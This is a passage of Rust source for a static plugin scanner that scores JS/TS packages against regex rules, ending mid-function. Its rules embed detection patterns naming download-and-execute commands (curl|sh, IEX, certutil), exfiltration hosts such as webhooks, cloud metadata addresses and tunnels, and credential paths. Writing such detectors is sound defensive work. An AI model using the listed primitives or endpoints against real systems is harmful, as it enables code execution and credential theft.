//! ─── 插件体检（移植自 wulun811/dsh-plugin-vet）───
//!
//! 原插件是 DSH 插件的信任流水线：确定性静态扫描（20 条规则）→ 评分卡 → 审计协议
//! → 可选运行时守卫。它的定位是**告警器而不是执法者**：只检查、告警、建议，
//! 绝不自行卸载/改配置/杀进程。
//!
//! 本模块移植**可移植的静态层**（原插件的价值主体）：
//!   - 评分模型：权重 critical 45 / high 20 / medium 8 / info 0，
//!     置信系数 certain 1.0 / likely 0.8 / heuristic 0.5，
//!     `staticScore = clamp(round(100 − Σ(权重×系数)), 0, 100)`
//!   - 判决：**只有非 heuristic 的发现才能改变判决**（critical → critical；high → suspicious；否则 clean）
//!   - 规则：R1/R2/R3/R4/R6/R7/R9/R11/R12/R13/R14/R17/R20 的文本层 + R16 依赖一致性
//!   - N1 能力清单（hosts / fsPaths / spawnCmds / imports / hasNetwork / hasExec）
//!   - 评分卡渲染 + 审计健康档案落盘
//!
//! 保真说明（不做假的承诺）：原插件的 R1–R5 建立在 **TypeScript 编译器 AST** 上
//! （作用域/遮蔽/常量折叠/别名追踪）。这里用正则+启发式实现，因此这些规则被标为
//! `heuristic` 或 `likely` 而非 `certain`，并且**永远不会单独把判决推到 critical**——
//! 这是对"不得虚报确定性"的诚实处理。R8/R10/R15/R18/R19 与 OSV 未实现。

use serde::{Deserialize, Serialize};
use std::path::{Path, PathBuf};

// ════════════════════════════════════════════════════════
// 评分模型
// ════════════════════════════════════════════════════════

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Severity {
    Critical,
    High,
    Medium,
    Info,
}

impl Severity {
    pub fn weight(self) -> f64 {
        match self {
            Severity::Critical => 45.0,
            Severity::High => 20.0,
            Severity::Medium => 8.0,
            Severity::Info => 0.0,
        }
    }
    pub fn as_str(self) -> &'static str {
        match self {
            Severity::Critical => "critical",
            Severity::High => "high",
            Severity::Medium => "medium",
            Severity::Info => "info",
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Confidence {
    Certain,
    Likely,
    Heuristic,
}

impl Confidence {
    pub fn coef(self) -> f64 {
        match self {
            Confidence::Certain => 1.0,
            Confidence::Likely => 0.8,
            Confidence::Heuristic => 0.5,
        }
    }
    pub fn as_str(self) -> &'static str {
        match self {
            Confidence::Certain => "certain",
            Confidence::Likely => "likely",
            Confidence::Heuristic => "heuristic",
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Verdict {
    Clean,
    Suspicious,
    Critical,
}

impl Verdict {
    pub fn as_str(self) -> &'static str {
        match self {
            Verdict::Clean => "clean",
            Verdict::Suspicious => "suspicious",
            Verdict::Critical => "critical",
        }
    }
    pub fn rank(self) -> u8 {
        match self {
            Verdict::Clean => 0,
            Verdict::Suspicious => 1,
            Verdict::Critical => 2,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Finding {
    pub rule: String,
    pub severity: Severity,
    pub confidence: Confidence,
    pub message: String,
    pub evidence: String,
    pub file: Option<String>,
    pub line: Option<usize>,
}

impl Finding {
    fn penalty(&self) -> f64 {
        self.severity.weight() * self.confidence.coef()
    }
}

/// 评分 + 判决（判决只由非 heuristic 发现决定）
pub fn score_findings(findings: &[Finding]) -> (u8, Verdict) {
    let penalty: f64 = findings.iter().map(|f| f.penalty()).sum();
    let score = (100.0 - penalty).round().clamp(0.0, 100.0) as u8;
    let decisive: Vec<&Finding> = findings
        .iter()
        .filter(|f| f.confidence != Confidence::Heuristic)
        .collect();
    let verdict = if decisive.iter().any(|f| f.severity == Severity::Critical) {
        Verdict::Critical
    } else if decisive.iter().any(|f| f.severity == Severity::High) {
        Verdict::Suspicious
    } else {
        Verdict::Clean
    };
    (score, verdict)
}

// ════════════════════════════════════════════════════════
// N1 能力清单
// ════════════════════════════════════════════════════════

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct CapabilityManifest {
    pub hosts: Vec<String>,
    pub fs_paths: Vec<String>,
    pub spawn_cmds: Vec<String>,
    pub imports: Vec<String>,
    pub has_network: bool,
    pub has_exec: bool,
    pub ghost_deps: Vec<String>,
    pub zombie_deps: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ScanReport {
    pub engine: String,
    pub target: String,
    pub source_count: usize,
    pub findings: Vec<Finding>,
    pub static_score: u8,
    pub verdict: Verdict,
    pub capabilities: CapabilityManifest,
    pub scanned_at: String,
}

// ════════════════════════════════════════════════════════
// 规则实现（正则 + 启发式）
// ════════════════════════════════════════════════════════

fn re(p: &str) -> regex::Regex {
    // 编译失败视为不匹配（模式是本模块内的常量，正常不会失败）
    regex::Regex::new(p).unwrap_or_else(|_| regex::Regex::new(r"\b\Z").unwrap())
}

struct RuleHit {
    rule: &'static str,
    severity: Severity,
    confidence: Confidence,
    message: &'static str,
    evidence: String,
    line: usize,
}

/// 对单个文本源跑规则
fn scan_text(rel_path: &str, text: &str) -> Vec<Finding> {
    let mut hits: Vec<RuleHit> = Vec::new();
    let lower = text.to_lowercase();

    let line_of = |needle: &str| -> usize {
        text.lines()
            .position(|l| l.contains(needle))
            .map(|i| i + 1)
            .unwrap_or(1)
    };
    let snippet = |needle: &str| -> String {
        text.lines()
            .find(|l| l.contains(needle))
            .unwrap_or("")
            .trim()
            .chars()
            .take(200)
            .collect()
    };

    // ─── R2 动态执行 ───
    for (pat, sev, msg) in [
        (r"new\s+Function\s*\(", Severity::High, "使用 new Function 动态执行代码"),
        (r"\beval\s*\(", Severity::High, "使用 eval 动态执行代码"),
        (r"vm\.runIn(New)?Context\s*\(", Severity::High, "使用 vm 模块在当前进程执行代码"),
        (r#"globalThis\s*\[\s*['\"]eval['\"]\s*\]"#, Severity::High, "间接调用 globalThis['eval']"),
        (r"\(\s*0\s*,\s*eval\s*\)", Severity::High, "间接调用 (0, eval)"),
    ] {
        if let Some(m) = re(pat).find(text) {
            hits.push(RuleHit {
                rule: "R2",
                severity: sev,
                confidence: Confidence::Likely,
                message: msg,
                evidence: snippet(m.as_str()),
                line: line_of(m.as_str()),
            });
        }
    }
    // 危险内建模块 require
    if let Some(m) = re(r#"require\s*\(\s*['\"](?:node:)?(?:child_process|vm|worker_threads|cluster|net|dgram|tls|http|https|http2)['\"]"#).find(text) {
        hits.push(RuleHit {
            rule: "R2",
            severity: Severity::High,
            confidence: Confidence::Likely,
            message: "require 危险内建模块（进程/网络/执行）",
            evidence: snippet(m.as_str()),
            line: line_of(m.as_str()),
        });
    }

    // ─── R1 构造链逃逸（启发式：AST 缺失，永不单独定性 critical）───
    if let Some(m) = re(r#"\.\s*constructor\s*\(|\[\s*['\"]constructor['\"]\s*\]"#).find(text) {
        hits.push(RuleHit {
            rule: "R1",
            severity: Severity::High,
            confidence: Confidence::Heuristic,
            message: "疑似构造链逃逸（.constructor 调用/取值）——正则无法做作用域遮蔽分析，需人工确认",
            evidence: snippet(m.as_str()),
            line: line_of(m.as_str()),
        });
    }

    // ─── R3 process 成员访问 ───
    if let Some(m) = re(r"process\s*\.\s*(getBuiltinModule|mainModule|module|reallyExit)\b|process\s*\.\s*exit\b").find(text) {
        let criticalish = !m.as_str().contains("exit");
        hits.push(RuleHit {
            rule: "R3",
            severity: if criticalish { Severity::High } else { Severity::Medium },
            confidence: Confidence::Certain,
            message: "访问 process 高危成员（绕过宿主边界）",
            evidence: snippet(m.as_str()),
            line: line_of(m.as_str()),
        });
    }

    // ─── R4 原型污染 ───
    if let Some(m) = re(r"(Object|Array|String|Number|Function|Promise|RegExp)\s*\.\s*prototype\s*(\.\s*\w+\s*)?=").find(text) {
        hits.push(RuleHit {
            rule: "R4",
            severity: Severity::High,
            confidence: Confidence::Likely,
            message: "修改内建原型（宿主原型污染）",
            evidence: snippet(m.as_str()),
            line: line_of(m.as_str()),
        });
    }
    if let Some(m) = re(r"(Object|Reflect)\s*\.\s*definePropert(y|ies)\s*\(\s*(Object|Array|String|Number|Function|Promise)\s*\.\s*prototype").find(text) {
        hits.push(RuleHit {
            rule: "R4",
            severity: Severity::High,
            confidence: Confidence::Likely,
            message: "用 defineProperty 污染内建原型",
            evidence: snippet(m.as_str()),
            line: line_of(m.as_str()),
        });
    }

    // ─── R6 粗粒度字符串（仅观测；必须与动态执行信号同现才算混淆证据）───
    let obfuscation = re(r"String\.fromCharCode|Buffer\.from\s*\([^)]*base64|atob\s*\(|charCodeAt");
    let dyn_exec = re(r"\beval\s*\(|new\s+Function\s*\(");
    if obfuscation.is_match(text) && dyn_exec.is_match(text) {
        let m = obfuscation.find(text).unwrap();
        hits.push(RuleHit {
            rule: "R6",
            severity: Severity::Info,
            confidence: Confidence::Heuristic,
            message: "混淆特征与动态执行信号同现",
            evidence: snippet(m.as_str()),
            line: line_of(m.as_str()),
        });
    }

    // ─── R7 硬编码密钥 ───
    // 占位符排除：xxx / example / your-key / <...>
    let secrets = re(r"sk-[A-Za-z0-9]{16,}|sk-proj-[A-Za-z0-9_-]{16,}|AKIA[0-9A-Z]{16}|AIza[0-9A-Za-z_-]{35}|gh[pousr]_[A-Za-z0-9]{36,}|github_pat_[A-Za-z0-9_]{22,}|xox[baprs]-[A-Za-z0-9-]{10,}");
    if text.len() <= 64 * 1024 {
        if let Some(m) = secrets.find(text) {
            let ev = m.as_str();
            let is_placeholder = ev.to_lowercase().contains("xxx")
                || ev.to_lowercase().contains("example")
                || ev.contains("REDACTED")
                || ev.to_lowercase().contains("your-key");
            if !is_placeholder {
                hits.push(RuleHit {
                    rule: "R7",
                    severity: Severity::High,
                    confidence: Confidence::Likely,
                    message: "疑似硬编码密钥/凭证字面量",
                    evidence: format!("{}…", &ev[..ev.len().min(24)]),
                    line: line_of(ev),
                });
            }
        }
    }

    // ─── R9 资源安全（无出口同步死循环 / 超大分配）───
    if let Some(m) = re(r"while\s*\(\s*(?:true|1|!0)\s*\)|for\s*\(\s*;\s*;\s*\)").find(text) {
        // 同一函数体内是否有 break/return（粗略：整段文本）
        let has_exit = re(r"\bbreak\b|\breturn\b").is_match(text);
        hits.push(RuleHit {
            rule: "R9",
            severity: if has_exit { Severity::Info } else { Severity::High },
            confidence: Confidence::Likely,
            message: if has_exit {
                "同步死循环（同文件存在 break/return，可能是受控循环）"
            } else {
                "无出口同步死循环（会占满主线程）"
            },
            evidence: snippet(m.as_str()),
            line: line_of(m.as_str()),
        });
    }
    if let Some(m) = re(r"new\s+Array\s*\(\s*(\d{9,})\s*\)|Buffer\.alloc\w*\s*\(\s*(\d{9,})").find(text) {
        let big = re(r"\d{9,}").find(m.as_str()).and_then(|n| n.as_str().parse::<u64>().ok()).unwrap_or(0);
        if big >= 100_000_000 {
            hits.push(RuleHit {
                rule: "R9",
                severity: Severity::High,
                confidence: Confidence::Certain,
                message: "超大内存分配（≥1e8）",
                evidence: snippet(m.as_str()),
                line: line_of(m.as_str()),
            });
        }
    }

    // ─── R11 破坏性文件操作 ───
    let sensitive = r"(/etc/|/root/|/usr/|/boot/|/proc/|/sys/|\.ssh|/\.aws|/\.gnupg|crontab)";
    if let Some(m) = re(&format!(r#"(unlink|rm|rmdir|rmSync|unlinkSync)\w*\s*\(\s*['\"][^'\"]*{}"#, sensitive)).find(&lower) {
        hits.push(RuleHit {
            rule: "R11",
            severity: Severity::High,
            confidence: Confidence::Likely,
            message: "对敏感路径执行删除操作",
            evidence: snippet(m.as_str()),
            line: line_of(m.as_str()),
        });
    }
    if let Some(m) = re(&format!(r#"(writeFile|appendFile|rename|copyFile|truncate|createWriteStream)\w*\s*\(\s*['\"][^'\"]*{}"#, sensitive)).find(&lower) {
        hits.push(RuleHit {
            rule: "R11",
            severity: Severity::High,
            confidence: Confidence::Likely,
            message: "对敏感路径执行写入操作",
            evidence: snippet(m.as_str()),
            line: line_of(m.as_str()),
        });
    }

    // ─── R13 外传端点 ───
    let sinks = re(r"discord(?:app)?\.com/api/webhooks|api\.telegram\.org/bot|hooks\.slack\.com|169\.254\.169\.254|metadata\.google\.internal|100\.100\.100\.200|[a-z2-7]{16}\.onion|[a-z2-7]{56}\.onion");
    if let Some(m) = sinks.find(text) {
        // 守卫上下文降噪
        let ctx_ok = re(r"DENY|BLOCK|REFUSE|FORBID|GUARD|PRIVATE|RESERVED|INTERNAL|METADATA|SSRF|REDACTED")
            .is_match(text);
        hits.push(RuleHit {
            rule: "R13",
            severity: if ctx_ok { Severity::Info } else { Severity::High },
            confidence: Confidence::Likely,
            message: if ctx_ok {
                "外传端点出现在守卫/拒绝名单上下文中（已降噪）"
            } else {
                "硬编码数据外传端点（webhook / 云元数据 / Tor）"
            },
            evidence: snippet(m.as_str()),
            line: line_of(m.as_str()),
        });
    }

    // ─── R20 spawn/exec 参数里的下载执行 ───
    let has_child_binding = re(r#"require\s*\(\s*['\"](?:node:)?child_process['\"]|from\s+['\"](?:node:)?child_process['\"]|child_process"#).is_match(text);
    if has_child_binding {
        let pipe_exec = re(r#"curl[^'\"]*\|\s*(?:ba)?sh|wget[^'\"]*\|\s*(?:ba)?sh|Invoke-Expression|IEX\s*\(|certutil|bitsadmin|mshta|regsvr32|rundll32|DownloadString"#);
        if let Some(m) = pipe_exec.find(text) {
            hits.push(RuleHit {
                rule: "R20",
                severity: Severity::High,
                confidence: Confidence::Likely,
                message: "子进程参数中的下载并执行（curl|sh / IEX / certutil 等）",
                evidence: snippet(m.as_str()),
                line: line_of(m.as_str()),
            });
        }
    }

    // ─── R14 非 JS 脚本的下载执行 ───
    let is_script = [".sh", ".bash", ".ps1", ".cmd", ".bat", ".psm1", ".zsh"]
        .iter()
        .any(|e| rel_path.to_lowercase().ends_with(e));
    if is_script {
        if let Some(m) = re(r"curl[^\n]*\|\s*(?:ba)?sh|wget[^\n]*\|\s*(?:ba)?sh|-enc\s+[A-Za-z0-9+/=]{20,}|IEX\b|Invoke-Expression|certutil|bitsadmin|mshta|regsvr32|scrobj").find(text) {
            hits.push(RuleHit {
                rule: "R14",
                severity: Severity::High,
                confidence: Confidence::Likely,
                message: "脚本中的下载并执行原语",
                evidence: snippet(m.as_str()),
                line: line_of(m.as_str()),
            });
        }
    }

    hits.into_iter()
        .map(|h| Finding {
            rule: h.rule.into(),
            severity: h.severity,
            confidence: h.confidence,
            message: h.message.into(),
            evidence: h.evidence,
            file: Some(rel_path.to_string()),
            line: Some(h.line),
        })
        .collect()
}

/// R12：Cordis/DSH bundle 契约（仅对"插件意图"的包）
fn check_bundle_contract(root: &Path, pkg: &serde_json::Value, rel: &str) -> Vec<Finding> {
    let mut out = Vec::new();
    let plugin_intent = pkg
        .get("dependencies")
        .and_then(|d| d.as_object())
        .map(|d| d.keys().any(|k| k.starts_with("@deepseek-ai/")))
        .unwrap_or(false)
        || pkg.get("dsh").is_some()
        || pkg.get("cordis").is_some();
    if !plugin_intent {
        return out;
    }
    if pkg.get("name").and_then(|v| v.as_str()).unwrap_or("").is_empty() {
        out.push(Finding {
            rule: "R12".into(),
            severity: Severity::Medium,
            confidence: Confidence::Likely,
            message: "声明了插件意图（@deepseek-ai 依赖 / dsh 字段）但 package.json 缺少 name".into(),
            evidence: rel.to_string(),
            file: Some(rel.to_string()),
            line: None,
        });
    }
    // dsh.bundle.patch 形状
    if let Some(patch) = pkg.pointer("/dsh/bundle/patch") {
        let ok = patch.is_string() || patch.as_array().map(|a| a.iter().all(|v| v.is_string())).unwrap_or(false);
        if !ok {
            out.push(Finding {
                rule: "R12".into(),
                severity: Severity::High,
                confidence: Confidence::Certain,
                message: "dsh.bundle.patch 形状非法（应为字符串或字符串数组）".into(),
                evidence: patch.to_string().chars().take(120).collect(),
                file: Some(rel.to_string()),
                line: None,
            });
        }
        // 声明的 patch 文件必须存在于包内（限定包根，防目录穿越）
        let declared: Vec<String> = if let Some(s) = patch.as_str() {
            vec![s.to_string()]
        } else {
            patch.as_array().map(|a| a.iter().filter_map(|v| v.as_str().map(|s| s.to_string())).collect()).unwrap_or_default()
        };
        for d in declared {
            if d.contains("..") {
                continue;
            }
            if !root.join(&d).exists() {
                out.push(Finding {
                    rule: "R12".into(),
                    severity: Severity::High,
                    confidence: Confidence::Certain,
                    message: format!("声明的 bundle patch 文件不存在：{}", d),
                    evidence: d,
                    file: Some(rel.to_string()),
                    line: None,
                });
            }
        }
    }
    // 入口
    let has_entry = pkg.get("main").and_then(|v| v.as_str()).map(|s| root.join(s).exists()).unwrap_or(false)
        || pkg.pointer("/exports/.").is_some()
        || root.join("index.js").exists();
    if !has_entry {
        out.push(Finding {
            rule: "R12".into(),
            severity: Severity::Medium,
            confidence: Confidence::Likely,
            message: "插件包找不到可用入口（exports['.'] → main → index.js 均缺失）".into(),
            evidence: rel.to_string(),
            file: Some(rel.to_string()),
            line: None,
        });
    }
    out
}

/// R17：`!!js` 配置注入（仅文本提取，绝不求值）
fn check_config_injection(rel: &str, text: &str) -> Vec<Finding> {
    let mut out = Vec::new();
    if !text.contains("!!js") && !text.contains("!js") {
        return out;
    }
    let danger_verbs = re(r"child_process|process\.exit|require\s*\(|eval\s*\(|new\s+Function|fetch\s*\(|exec\s*\(|spawn\s*\(|vm\.|curl|wget");
    let exfil_hosts = re(r"webhook\.site|requestbin|ngrok|localtunnel|pastebin|oast\.|burpcollaborator|dnslog\.cn|interact\.sh");
    let cred_paths = re(r"\.ssh|id_rsa|\.aws|credentials|\.npmrc|\.env|kubeconfig|\.pgpass|\.netrc|\.git-credentials|PRIVATE KEY");
    let has_verb = danger_verbs.is_match(text);
    let has_exfil = exfil_hosts.is_match(text);
    let has_cred = cred_paths.is_match(text);
    if has_verb && (has_exfil || has_cred) {
        out.push(Finding {
            rule: "R17".into(),
            severity: Severity::High,
            confidence: Confidence::Likely,
            message: "!!js 配置中同时出现危险动词与（外传主机 或 凭证路径）——双重组合".into(),
            evidence: text.lines().find(|l| l.contains("!!js")).unwrap_or("").trim().chars().take(200).collect(),
            file: Some(rel.to_string()),
            line: None,
        });
    } else if has_verb {
        out.push(Finding {
            rule: "R17".into(),
            severity: Severity::Info,
            confidence: Confidence::Heuristic,
            message: "!!js 配置中存在危险动词（仅观测）".into(),
            evidence: text.lines().find(|l| l.contains("!!js")).unwrap_or("").trim().chars().take(200).collect(),
            file: Some(rel.to_string()),
            line: None,
        });
    }
    out
}

/// N1 能力提取
fn extract_capabilities(text: &str, manifest: &mut CapabilityManifest) {
    for cap in re(r#"https?://[A-Za-z0-9._~:/?#\[\]@!$&'()*+,;=%-]{4,120}"#).find_iter(text) {
        let mut s = cap.as_str().to_string();
        if let Some(idx) = s.find("://") {
            s = s[idx + 3..].to_string();
        }
        let host: String = s.chars().take_while(|c| *c != '/' && *c != '?' && *c != '#').collect();
        if !host.is_empty()
            && !host.contains("localhost")
            && !host.starts_with("127.")
            && manifest.hosts.len() < 50
            && !manifest.hosts.contains(&host)
        {
            manifest.hosts.push(host);
            manifest.has_network = true;
        }
    }
    for cap in re(r#"['\"]([A-Za-z]:\\[^'\"]{2,80}|/(?:etc|root|usr|var|home|tmp|proc|sys)/[^'\"]{0,80})['\"]"#).captures_iter(text) {
        if let Some(m) = cap.get(1) {
            let p = m.as_str().to_string();
            if manifest.fs_paths.len() < 50 && !manifest.fs_paths.contains(&p) {
                manifest.fs_paths.push(p);
            }
        }
    }
    for cap in re(r#"\b(?:spawn|exec|execFile|fork)\w*\s*\(\s*['\"]([^'\"]{1,60})['\"]"#).captures_iter(text) {
        if let Some(m) = cap.get(1) {
            let c = m.as_str().to_string();
            if manifest.spawn_cmds.len() < 20 && !manifest.spawn_cmds.contains(&c) {
                manifest.spawn_cmds.push(c);
            }
            manifest.has_exec = true;
        }
    }
    // import 来源
    for cap in re(r#"(?:from\s+|require\s*\(\s*)['\"]([^'\"]{1,120})['\"]"#).captures_iter(text) {
        if let Some(m) = cap.get(1) {
            let s = m.as_str().to_string();
            // 只记录第三方裸模块（内置/相对路径除外）
            let bare = !s.starts_with('.') && !s.starts_with('/') && !s.starts_with("node:");
            if bare && manifest.imports.len() < 50 && !manifest.imports.contains(&s) {
                manifest.imports.push(s);
            }
        }
    }
    if re(r#"child_process|process\.exit|spawn|execSync"#).is_match(text) {
        manifest.has_exec = true;
    }
}

// ════════════════════════════════════════════════════════
// 扫描入口
// ════════════════════════════════════════════════════════

const SCANNABLE: [&str; 6] = [".js", ".ts", ".mjs", ".cjs", ".jsx", ".tsx"];
const SCRIPT_EXTS: [&str; 7] = [".sh", ".bash", ".ps1", ".cmd", ".bat", ".psm1", ".zsh"];
const SKIP_DIRS: [&str; 3] = ["node_modules", ".git", "target"];
const MAX_FILE_BYTES: u64 = 8 * 1024 * 1024;

fn collect_sources(root: &Path, depth: usize, out: &mut Vec<PathBuf>) {
    if depth > 6 || out.len() > 2000 {
        return;
    }
    let Ok(entries) = std::fs::read_dir(root) else { return };
    for e in entries.flatten() {
        let path = e.path();
        // 跳过符号链接（防止越出包根与链接环）
        let Ok(meta) = std::fs::symlink_metadata(&path) else { continue };
        if meta.file_type().is_symlink() {
            continue;
        }
        let name = e.file_name().to_string_lossy().to_string();
        if path.is_dir() {
            if SKIP_DIRS.contains(&name.as_str()) || name.starts_with('.') {
                continue;
            }
            collect_sources(&path, depth + 1, out);
        } else if let Ok(m) = path.metadata() {
            if m.len() > MAX_FILE_BYTES {
                continue;
            }
            let lower = name.to_lowercase();
            if SCANNABLE.iter().any(|x| lower.ends_with(x))
                || SCRIPT_EXTS.iter().any(|x| lower.ends_with(x))
                || lower == "package.json"
            {
                out.push(path);
            }
        }
    }
}

/// 扫描一个包目录或单文件
pub fn scan_path(target: &str) -> Result<ScanReport, String> {
    let root = PathBuf::from(target);
    if !root.exists() {
        return Err(format!("路径不存在：{}", target));
    }
    let mut findings: Vec<Finding> = Vec::new();
    let mut manifest = CapabilityManifest::default();
    let mut source_count = 0usize;

    let mut files: Vec<PathBuf> = Vec::new();
    if root.is_file() {
        files.push(root.clone());
    } else {
        collect_sources(&root, 0, &mut files);
    }

    let pkg_json_path = if root.is_file() {
        None
    } else {
        let p = root.join("package.json");
        if p.exists() { Some(p) } else { None }
    };

    for f in &files {
        let rel = f
            .strip_prefix(if root.is_file() { root.parent().unwrap_or(&root) } else { &root })
            .unwrap_or(f)
            .to_string_lossy()
            .replace('\\', "/");
        let Ok(text) = std::fs::read_to_string(f) else { continue };
        source_count += 1;

        // 包清单：R12 + 依赖一致性输入
        if rel.ends_with("package.json") {
            if let Ok(pkg) = serde_json::from_str::<serde_json::Value>(&text) {
                let base = if root.is_file() { root.parent().unwrap_or(&root) } else { &root };
                findings.extend(check_bundle_contract(base, &pkg, &rel));
            }
            continue;
        }

        // 配置注入：R17
        if rel.ends_with(".yml") || rel.ends_with(".yaml") {
            findings.extend(check_config_injection(&rel, &text));
            extract_capabilities(&text, &mut manifest);
            continue;
        }

        extract_capabilities(&text, &mut manifest);
        findings.extend(scan_text(&rel, &text));
    }

    // R16 依赖一致性（ghost / zombie）
    if let Some(p) = &pkg_json_path {
        if let Ok(text) = std::fs::read_to_string(p) {
            if let Ok(pkg) = serde_json::from_str::<serde_json::Value>(&text) {
                let declared: std::collections::HashSet<String> = ["dependencies", "devDependencies", "peerDependencies", "optionalDependencies"]
                    .iter()
                    .filter_map(|k| pkg.get(*k).and_then(|v| v.as_object()))
                    .flat_map(|o| o.keys().cloned())
                    .collect();
                // ghost：代码 import 但未声明
                for imp in &manifest.imports {
                    if imp.starts_with("@deepseek-ai/") {
                        continue;
                    }
                    let pkg_name = if imp.starts_with('@') {
                        imp.split('/').take(2).collect::<Vec<_>>().join("/")
                    } else {
                        imp.split('/').next().unwrap_or("").to_string()
                    };
                    if pkg_name.is_empty() || declared.contains(&pkg_name) {
                        continue;
                    }
                    if manifest.ghost_deps.len() < 20 && !manifest.ghost_deps.contains(&pkg_name) {
                        manifest.ghost_deps.push(pkg_name.clone());
                    }
                }
                // zombie：声明但 node_modules 不存在
                let nm = if root.is_file() { root.parent().unwrap_or(&root).join("node_modules") } else { root.join("node_modules") };
                for d in &declared {
                    if manifest.zombie_deps.len() >= 20 {
                        break;
                    }
                    if !nm.join(d).exists() {
                        manifest.zombie_deps.push(d.clone());
                    }
                }
            }
        }
    }
    if !manifest.ghost_deps.is_empty() {
        findings.push(Finding {
            rule: "R16".into(),
            severity: Severity::Info,
            confidence: Confidence::Heuristic,
            message: format!("幽灵依赖（代码引用但未声明）：{}", manifest.ghost_deps.join(", ")),
            evidence: manifest.ghost_deps.join(", "),
            file: Some("package.json".into()),
            line: None,
        });
    }

    let (static_score, verdict) = score_findings(&findings);
    Ok(ScanReport {
        engine: "deepahead-static-v1".into(),
        target: target.to_string(),
        source_count,
        findings,
        static_score,
        verdict,
        capabilities: manifest,
        scanned_at: chrono::Utc::now().to_rfc3339(),
    })
}

// ════════════════════════════════════════════════════════
// 评分卡渲染 + 健康档案
// ════════════════════════════════════════════════════════

fn sev_icon(s: Severity) -> &'static str {
    match s {
        Severity::Critical => "🔴",
        Severity::High => "🟠",
        Severity::Medium => "🟡",
        Severity::Info => "⚪",
    }
}

/// 渲染两段式评分卡的第一段（确定性静态块）。
/// 注意：**静态分与人工审计结论刻意不合并成一个数字**——这是原插件的信任边界。
pub fn render_scorecard(r: &ScanReport, name: &str) -> String {
    let mut s = String::new();
    s.push_str(&format!("VET 评分卡: {}\n", name));
    s.push_str(&format!(
        "{} verdict: {} | staticScore: {}\n",
        sev_icon(match r.verdict {
            Verdict::Critical => Severity::Critical,
            Verdict::Suspicious => Severity::High,
            Verdict::Clean => Severity::Info,
        }),
        r.verdict.as_str(),
        r.static_score
    ));

    // 分项构成
    let mut by_sev: std::collections::BTreeMap<&str, (usize, f64)> = Default::default();
    let mut info_rules: std::collections::BTreeMap<&str, usize> = Default::default();
    for f in &r.findings {
        let e = by_sev.entry(f.severity.as_str()).or_insert((0, 0.0));
        e.0 += 1;
        e.1 += f.penalty();
        if f.severity == Severity::Info {
            *info_rules.entry(f.rule.as_str()).or_insert(0) += 1;
        }
    }
    let crit = by_sev.get("critical").map(|v| v.1).unwrap_or(0.0);
    let high = by_sev.get("high").map(|v| v.1).unwrap_or(0.0);
    let med = by_sev.get("medium").map(|v| v.1).unwrap_or(0.0);
    let info_n = by_sev.get("info").map(|v| v.0).unwrap_or(0);
    s.push_str(&format!(
        "  静态分构成: 100 - {:.0} = critical {:.0} + high {:.0} + medium {:.0} + info {:.0}（info 明细: {}）（verdict 只由 critical/high 决定）\n",
        crit + high + med,
        crit, high, med, info_n,
        if info_rules.is_empty() {
            "无".to_string()
        } else {
            info_rules.iter().map(|(k, v)| format!("{}×{}", k, v)).collect::<Vec<_>>().join(" + ")
        }
    ));

    s.push_str(&format!("扫描文件数: {}\n", r.source_count));
    if r.findings.is_empty() {
        s.push_str("静态发现: 无\n");
    } else {
        s.push_str(&format!("静态发现（{} 条）:\n", r.findings.len()));
        let mut sorted = r.findings.clone();
        sorted.sort_by_key(|f| std::cmp::Reverse(f.severity.weight() as u32));
        for f in sorted.iter().take(40) {
            let loc = match (&f.file, f.line) {
                (Some(fp), Some(l)) => format!("{}:{}", fp, l),
                (Some(fp), None) => fp.clone(),
                _ => String::new(),
            };
            s.push_str(&format!(
                "  [{}] {} ({}) {}{}\n",
                f.rule,
                f.message,
                f.confidence.as_str(),
                if loc.is_empty() { String::new() } else { format!("（{}）", loc) },
                if f.evidence.is_empty() { String::new() } else { format!(" — {}", f.evidence) }
            ));
        }
        if sorted.len() > 40 {
            s.push_str(&format!("  … 另有 {} 条\n", sorted.len() - 40));
        }
    }

    // N1 能力清单
    let c = &r.capabilities;
    s.push_str("\n能力清单（声明侧静态提取）:\n");
    s.push_str(&format!(
        "  网络 {} | 执行 {} | 主机 {} | 敏感路径 {} | 子进程 {} | 依赖 {}\n",
        if c.has_network { "是" } else { "否" },
        if c.has_exec { "是" } else { "否" },
        c.hosts.len(),
        c.fs_paths.len(),
        c.spawn_cmds.len(),
        c.imports.len()
    ));
    for h in c.hosts.iter().take(10) {
        s.push_str(&format!("  网络主机: {}\n", h));
    }
    for p in c.fs_paths.iter().take(10) {
        s.push_str(&format!("  路径: {}\n", p));
    }
    for x in c.spawn_cmds.iter().take(10) {
        s.push_str(&format!("  子进程: {}\n", x));
    }
    if !c.ghost_deps.is_empty() {
        s.push_str(&format!("  幽灵依赖: {}\n", c.ghost_deps.join(", ")));
    }
    if !c.zombie_deps.is_empty() {
        s.push_str(&format!("  僵尸依赖: {}\n", c.zombie_deps.join(", ")));
    }
    if c.hosts.is_empty() && c.fs_paths.is_empty() && c.spawn_cmds.is_empty() && c.imports.is_empty() {
        s.push_str("  （无静态敏感足迹）\n");
    }

    s.push_str("\n提示：静态层只做确定性判定，不构成安全结论。请按 vet-audit-protocol 逐条复核后再决定是否安装/启用。\n");
    s
}

/// 审计健康档案目录
pub fn audit_dir() -> PathBuf {
    crate::ai::rules_engine::dsh_home().join("vet").join("audits")
}

/// 写健康档案（第二段：人工/模型审计结论）
pub fn write_health_record(name: &str, version: &str, report: &ScanReport, risk: &str, recommendation: &str, notes: &str) -> Result<String, String> {
    let dir = audit_dir();
    std::fs::create_dir_all(&dir).map_err(|e| format!("创建审计目录失败: {}", e))?;
    let escaped = name.trim_start_matches('@').replace('/', "-");
    let ts = chrono::Utc::now().format("%Y%m%d-%H%M%S").to_string();
    let file = dir.join(format!("{}-{}-{}.md", escaped, version, ts));
    let mut s = String::new();
    s.push_str(&format!("# {}@{}\n\n", name, version));
    s.push_str(&format!("扫描时间: {}\n", report.scanned_at));
    s.push_str(&format!("静态判决: {} | 静态分: {}\n\n", report.verdict.as_str(), report.static_score));
    s.push_str("## Static findings\n\n");
    if report.findings.is_empty() {
